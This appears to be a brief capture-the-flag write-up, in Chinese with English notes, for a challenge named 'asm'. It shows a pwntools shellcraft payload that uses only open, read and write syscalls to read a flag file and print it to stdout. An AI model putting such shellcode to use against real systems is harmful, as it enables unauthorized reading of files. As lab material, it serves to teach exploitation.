# asm


製作shellocde 只能使用 orw 去讀 flag

程式碼裡面有一段 stub，清空暫存器



```
payload = shellcraft.open(file_name,0) 
payload += shellcraft.read('rax', 'rsp', 100) 
payload += shellcraft.write(1, 'rsp', 100) 
payload += shellcraft.exit(0)
```

- open return fd in rax
- read (rax,buf,size)
- write (stdout,buf,size)
